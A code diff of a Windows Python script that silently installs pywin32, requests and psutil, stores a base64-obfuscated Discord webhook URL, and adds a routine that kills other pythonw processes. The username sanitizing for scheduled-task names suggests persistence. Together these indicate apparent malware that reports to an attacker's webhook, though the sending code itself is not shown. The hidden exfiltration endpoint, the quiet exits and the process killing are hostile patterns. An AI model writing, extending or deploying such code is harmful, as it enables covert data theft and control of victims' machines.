@@ -6,13 +6,13 @@ from pathlib import Path
 
 def ensure_package(package_name, import_name):
     """
-    Ensure a Python package is installed and importable.
-
+    Ensure a Python package is installed.
+    
     :param package_name: Name used by pip (e.g. 'pywin32')
-    :param import_name: Full import path (e.g. 'win32com.client')
+    :param import_name: Module to test import (e.g. 'win32com.client')
     """
     try:
-        return importlib.import_module(import_name)
+        importlib.import_module(import_name)
     except ImportError:
         subprocess.check_call([
             sys.executable,
@@ -22,19 +22,19 @@ def ensure_package(package_name, import_name):
             "--upgrade",
             package_name,
         ])
-        return importlib.import_module(import_name)
 
-win32 = ensure_package("pywin32", "win32com.client")
+ensure_package("pywin32", "win32com.client")
+ensure_package("requests", "requests")
+ensure_package("psutil", "psutil")
+
+IMPORT_ERROR = False
 
 try:
     import win32com.client
-except:
-    pass
-
-try:
     import requests
+    import psutil
 except:
-    pass
+    exit()
 
 WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzAwNjk4NTAzMDI3MTA3Ni9xdUVRY0VxcEFGN3c2TUg4REduSlRtaTBuSUtFVGl2WXpMbEpVNlNSLUpsSWxGYmNLaUtFNDVlczZ1ZGxmOGVFQklBZw=="
 
@@ -140,6 +140,18 @@ def sanitize_username(username: str) -> str:
     Replace characters not allowed in task names with '_'
     """
     return re.sub(r'[^a-zA-Z0-9._-]', '_', username)
+
+def kill_other_pythonw():
+    current_pid = os.getpid()
+
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            if proc.info['name'] and 'pythonw' in proc.info['name'].lower():
+                if proc.info['pid'] != current_pid:
+                    print(f"Killing PID {proc.info['pid']}")
+                    proc.kill()
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            pass
 
 def kill_process(process_name):
     try:
